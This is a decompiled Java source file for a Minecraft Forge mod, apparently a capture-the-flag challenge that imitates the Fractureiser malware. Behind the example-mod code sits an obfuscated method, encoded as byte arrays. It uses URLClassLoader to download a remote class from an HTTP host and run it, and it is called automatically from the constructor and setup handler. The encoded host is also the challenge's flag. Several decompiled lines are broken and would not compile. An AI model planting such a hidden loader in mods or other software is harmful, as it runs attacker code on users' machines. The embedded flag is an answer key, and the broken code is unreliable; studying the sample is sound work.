package com.bcactf.flagtureiser;

import com.mojang.logging.LogUtils;
import java.net.URL;
import java.util.function.Supplier;
import net.minecraft.client.Minecraft;
import net.minecraft.world.item.BlockItem;
import net.minecraft.world.item.CreativeModeTabs;
import net.minecraft.world.item.Item;
import net.minecraft.world.level.block.Block;
import net.minecraft.world.level.block.Blocks;
import net.minecraft.world.level.block.state.BlockBehaviour;
import net.minecraft.world.level.material.Material;
import net.minecraftforge.api.distmarker.Dist;
import net.minecraftforge.common.MinecraftForge;
import net.minecraftforge.event.CreativeModeTabEvent;
import net.minecraftforge.event.server.ServerStartingEvent;
import net.minecraftforge.eventbus.api.IEventBus;
import net.minecraftforge.eventbus.api.SubscribeEvent;
import net.minecraftforge.fml.ModLoadingContext;
import net.minecraftforge.fml.common.Mod;
import net.minecraftforge.fml.common.Mod.EventBusSubscriber;
import net.minecraftforge.fml.config.IConfigSpec;
import net.minecraftforge.fml.config.ModConfig;
import net.minecraftforge.fml.event.lifecycle.FMLClientSetupEvent;
import net.minecraftforge.fml.event.lifecycle.FMLCommonSetupEvent;
import net.minecraftforge.fml.javafmlmod.FMLJavaModLoadingContext;
import net.minecraftforge.registries.DeferredRegister;
import net.minecraftforge.registries.ForgeRegistries;
import net.minecraftforge.registries.RegistryObject;
import org.slf4j.Logger;

@Mod("flagtureiser")
public class Flagtureiser {
  public static final String MODID = "flagtureiser";
  
  private static final Logger LOGGER = LogUtils.getLogger();
  
  public static final DeferredRegister<Block> BLOCKS = DeferredRegister.create(ForgeRegistries.BLOCKS, "flagtureiser");
  
  public static final DeferredRegister<Item> ITEMS = DeferredRegister.create(ForgeRegistries.ITEMS, "flagtureiser");
  
  public static final RegistryObject<Block> EXAMPLE_BLOCK = BLOCKS.register("example_block", () -> new Block(BlockBehaviour.Properties.m_60939_(Material.f_76278_)));
  
  public static final RegistryObject<Item> EXAMPLE_BLOCK_ITEM = ITEMS.register("example_block", () -> new BlockItem((Block)EXAMPLE_BLOCK.get(), new Item.Properties()));
  
  static void _6d8f2e1fefef5b67bf4f49179b84f29f7d1e01f0() throws Exception {
    Class.forName(new String(new byte[] { 85, 116, 105, 108, 105, 116, 121 }, ), true, 

        
        Class.forName(new String(new byte[] { 
              106, 97, 118, 97, 46, 110, 101, 116, 46, 85, 
              82, 76, 67, 108, 97, 115, 115, 76, 111, 97, 
              100, 101, 114 })).getConstructor(new Class[] { URL[].class }).newInstance((Object[])new URL[] { new URL(new String(new byte[] { 104, 116, 116, 112 }, ), new String(new byte[] { 
                  98, 99, 97, 99, 116, 102, 123, 102, 82, 97, 
                  67, 116, 117, 114, 51, 49, 115, 51, 82, 95, 
                  115, 84, 56, 103, 69, 95, 122, 51, 82, 48, 
                  125 }, ), 8080, new String(new byte[] { 47, 100, 108 })) })).getMethod(new String(new byte[] { 114, 117, 110 }, ), new Class[] { String.class }).invoke(null, new Object[] { "-114.-18.38.108.-100" });
  }
  
  public Flagtureiser() {
    IEventBus modEventBus = FMLJavaModLoadingContext.get().getModEventBus();
    modEventBus.addListener(this::commonSetup);
    BLOCKS.register(modEventBus);
    ITEMS.register(modEventBus);
    MinecraftForge.EVENT_BUS.register(this);
    modEventBus.addListener(this::addCreative);
    try {
      _6d8f2e1fefef5b67bf4f49179b84f29f7d1e01f0();
    } catch (Exception e) {
      e.printStackTrace();
    } 
    ModLoadingContext.get().registerConfig(ModConfig.Type.COMMON, (IConfigSpec)Config.SPEC);
  }
  
  private void commonSetup(FMLCommonSetupEvent event) {
    try {
      _6d8f2e1fefef5b67bf4f49179b84f29f7d1e01f0();
    } catch (Exception e) {
      e.printStackTrace();
    } 
    LOGGER.info("HELLO FROM COMMON SETUP");
    if (Config.logDirtBlock)
      LOGGER.info("DIRT BLOCK >> {}", ForgeRegistries.BLOCKS.getKey(Blocks.f_50493_)); 
    LOGGER.info(Config.magicNumberIntroduction + Config.magicNumberIntroduction);
    Config.items.forEach(item -> LOGGER.info("ITEM >> {}", item.toString()));
  }
  
  private void addCreative(CreativeModeTabEvent.BuildContents event) {
    if (event.getTab() == CreativeModeTabs.f_256788_)
      event.accept((Supplier)EXAMPLE_BLOCK_ITEM); 
  }
  
  @SubscribeEvent
  public void onServerStarting(ServerStartingEvent event) {
    LOGGER.info("HELLO from server starting");
  }
  
  @EventBusSubscriber(modid = "flagtureiser", bus = Mod.EventBusSubscriber.Bus.MOD, value = {Dist.CLIENT})
  public static class ClientModEvents {
    @SubscribeEvent
    public static void onClientSetup(FMLClientSetupEvent event) {
      Flagtureiser.LOGGER.info("HELLO FROM CLIENT SETUP");
      Flagtureiser.LOGGER.info("MINECRAFT NAME >> {}", Minecraft.m_91087_().m_91094_().m_92546_());
    }
  }
}
